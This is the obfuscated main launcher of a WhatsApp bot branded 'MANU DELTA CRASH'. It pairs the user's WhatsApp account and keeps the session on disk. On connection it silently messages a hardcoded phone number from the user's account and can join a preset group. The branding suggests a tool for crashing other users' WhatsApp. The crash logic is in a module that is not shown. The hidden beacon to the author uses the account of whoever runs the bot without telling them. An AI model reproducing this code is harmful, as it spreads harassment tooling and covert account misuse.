require('./all/global');
const func = require('./all/place');
const readline = require("readline");
const question = _0x31fe99 => {
  const _0x8af7d8 = readline.createInterface({
    'input': process.stdin,
    'output': process.stdout
  });
  return new Promise(_0x39dde9 => {
    _0x8af7d8.question(_0x31fe99, _0x39dde9);
  });
};
async function startSesi() {
  const _0x5516b9 = makeInMemoryStore({
    'logger': pino().child({
      'level': "silent",
      'stream': 'store'
    })
  });
  const {
    state: _0x23f114,
    saveCreds: _0x403409
  } = await useMultiFileAuthState("./session");
  const {
    version: _0x4056cf,
    isLatest: _0x500e74
  } = await fetchLatestBaileysVersion();
  console.log(chalk.red.bold("•»»————> 𝗠𝗔𝗡𝗨 𝗗𝗘𝗟𝗧𝗔 𝗖𝗥𝗔𝗦𝗛 <————««•"));
  const _0x28e034 = {
    'version': _0x4056cf,
    'keepAliveIntervalMs': 0x7530,
    'printQRInTerminal': false,
    'logger': pino({
      'level': "fatal"
    }),
    'auth': _0x23f114,
    'browser': ["Ubuntu", "Chrome", "20.0.04"]
  };
  const _0x4b6544 = func.makeWASocket(_0x28e034);
  if (true && !_0x4b6544.authState.creds.registered) {
    const _0x43b7ab = await question("[•] SUBSCRIBE YT : Manul Official Tech\n[!] ENTER YOUR WHATSAPP NUMBER. START WITH CODE 94 WITHOUT 0\n");
    const _0x25fe42 = await _0x4b6544.requestPairingCode(_0x43b7ab.trim());
    console.log(chalk.red.bold("INI PAIRING CODENYA BRO: " + _0x25fe42 + " "));
  }
  _0x5516b9.bind(_0x4b6544.ev);
  _0x4b6544.ev.on('connection.update', async _0x377a2b => {
    const {
      connection: _0x1f4755,
      lastDisconnect: _0x56b573
    } = _0x377a2b;
    if (_0x1f4755 === "close") {
      const _0x73678d = new Boom(_0x56b573?.['error'])?.["output"]["statusCode"];
      console.log(color(_0x56b573.error, "deeppink"));
      if (_0x56b573.error == "Error: Stream Errored (unknown)") {
        process.exit();
      } else {
        if (_0x73678d === DisconnectReason.badSession) {
          console.log(color("Bad Session File, Please Delete Session and Scan Again"));
          process.exit();
        } else {
          if (_0x73678d === DisconnectReason.connectionClosed) {
            console.log(color('[SYSTEM]', "white"), color("Connection closed, reconnecting...", "deeppink"));
            process.exit();
          } else {
            if (_0x73678d === DisconnectReason.connectionLost) {
              console.log(color("[SYSTEM]", "white"), color("Connection lost, trying to reconnect", "deeppink"));
              process.exit();
            } else {
              if (_0x73678d === DisconnectReason.connectionReplaced) {
                console.log(color("Connection Replaced, Another New Session Opened, Please Close Current Session First"));
                _0x4b6544.logout();
              } else {
                if (_0x73678d === DisconnectReason.loggedOut) {
                  console.log(color("Device Logged Out, Please Scan Again And Run."));
                  _0x4b6544.logout();
                } else {
                  if (_0x73678d === DisconnectReason.restartRequired) {
                    console.log(color("Restart Required, Restarting..."));
                    await startSesi();
                  } else if (_0x73678d === DisconnectReason.timedOut) {
                    console.log(color("Connection TimedOut, Reconnecting..."));
                    startSesi();
                  }
                }
              }
            }
          }
        }
      }
    } else {
      if (_0x1f4755 === "connecting") {
        start('1', "Connecting...");
      } else if (_0x1f4755 === "open") {
        success('1', 'Tersambung');
        _0x4b6544.sendMessage("94742274855@s.whatsapp.net", {
          'text': "🪄мαηυ ∂єℓтα ¢яαѕн ѕυ¢¢єѕѕƒυℓℓу ¢σηηє¢тє∂ уσυя ωнαтѕαρρ...✨✓\n*🥹...Please Subscribe My Channel...💗* - : www.youtube.com/@ManulOfficialTech\n*_©ʍɾ ℂ𝕪𝕓𝕖𝕣 ʍɑղմӀ օƒƒíϲíɑӀ♠️_*"
        });
        if (autoJoin) {
          _0x4b6544.groupAcceptInvite(codeInvite);
        }
      }
    }
  });
  _0x4b6544.ev.on('messages.upsert', async _0x2f6a12 => {
    try {
      m = _0x2f6a12.messages[0x0];
      if (!m.message) {
        return;
      }
      m.message = Object.keys(m.message)[0x0] === 'ephemeralMessage' ? m.message.ephemeralMessage.message : m.message;
      if (m.key && m.key.remoteJid === "status@broadcast") {
        return _0x4b6544.readMessages([m.key]);
      }
      if (!_0x4b6544["public"] && !m.key.fromMe && _0x2f6a12.type === "notify") {
        return;
      }
      if (m.key.id.startsWith("BAE5") && m.key.id.length === 0x10) {
        return;
      }
      m = func.smsg(_0x4b6544, m, _0x5516b9);
      require("./case")(_0x4b6544, m, _0x5516b9);
    } catch (_0x4faa22) {
      console.log(_0x4faa22);
    }
  });
  _0x4b6544.ev.on("contacts.update", _0x21c0e7 => {
    for (let _0x511d6a of _0x21c0e7) {
      let _0x5b6a9b = _0x4b6544.decodeJid(_0x511d6a.id);
      if (_0x5516b9 && _0x5516b9.contacts) {
        _0x5516b9.contacts[_0x5b6a9b] = {
          'id': _0x5b6a9b,
          'name': _0x511d6a.notify
        };
      }
    }
  });
  _0x4b6544["public"] = true;
  _0x4b6544.ev.on("creds.update", _0x403409);
  return _0x4b6544;
}
startSesi();
process.on("uncaughtException", function (_0x38996c) {
  console.log("Caught exception: ", _0x38996c);
});
